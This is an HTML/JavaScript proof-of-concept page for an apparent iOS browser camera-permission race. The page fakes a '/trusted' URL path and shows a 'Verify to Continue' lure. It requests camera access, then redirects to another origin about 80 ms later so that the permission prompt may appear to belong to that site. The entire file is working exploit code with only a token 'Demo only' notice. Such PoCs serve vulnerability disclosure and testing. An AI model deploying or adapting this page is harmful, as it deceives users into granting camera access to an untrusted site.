<!doctype html>
<html>
<head>
<meta charset="utf-8">
<title>iOS Camera Permission Race PoC</title>
<meta name="viewport" content="width=device-width, initial-scale=1">

<style>
body {
  margin:0;
  font-family:-apple-system,BlinkMacSystemFont,system-ui;
  background:#f5f5f7;
}

button {
  margin:6px;
  font-size:16px;
  padding:10px 14px;
}

#panel {
  display:none;
  max-width:520px;
  margin:60px auto;
  background:#fff;
  padding:24px;
  border-radius:16px;
  box-shadow:0 20px 60px rgba(0,0,0,.2);
}

h2 { text-align:center; margin-bottom:6px; }
.sub { text-align:center; color:#666; margin-bottom:20px; }

video {
  width:100%;
  margin-top:10px;
  background:#000;
  border-radius:12px;
}

.notice {
  margin-top:14px;
  font-size:13px;
  color:#b00020;
  text-align:center;
}
</style>
</head>

<body>

<div style="text-align:center">
  <button id="trigger">Start PoC</button>
</div>

<div id="panel">
  <h2>Verify to Continue</h2>
  <div class="sub">Camera access required</div>

  <button id="camBtn">Enable Camera</button>
  <video id="camera" autoplay playsinline></video>

  <div class="notice">
    Demo only — browser permission required
  </div>
</div>

<script>
const trigger = document.getElementById("trigger");
const panel   = document.getElementById("panel");
const camBtn  = document.getElementById("camBtn");
const video   = document.getElementById("camera");

let streamRef = null;

// 1️⃣ User starts flow
trigger.onclick = () => {
  // Visual trust manipulation
  history.pushState({}, "", "/trusted");

  panel.style.display = "block";
};

// 2️⃣ Camera permission request + navigation race
camBtn.onclick = () => {
  // Trigger sensitive permission
  navigator.mediaDevices.getUserMedia({ video:true })
    .then(stream => {
      streamRef = stream;
      video.srcObject = stream;
    })
    .catch(()=>{});

  // Race: navigate shortly after request
  requestAnimationFrame(() => {
    requestAnimationFrame(() => {
      setTimeout(() => {
        location.href = "https://google.com:9000";
      }, 80);
    });
  });
};

// Cleanup (optional)
addEventListener("pagehide", () => {
  if (streamRef) {
    streamRef.getTracks().forEach(t => t.stop());
  }
});
</script>

</body>
</html>
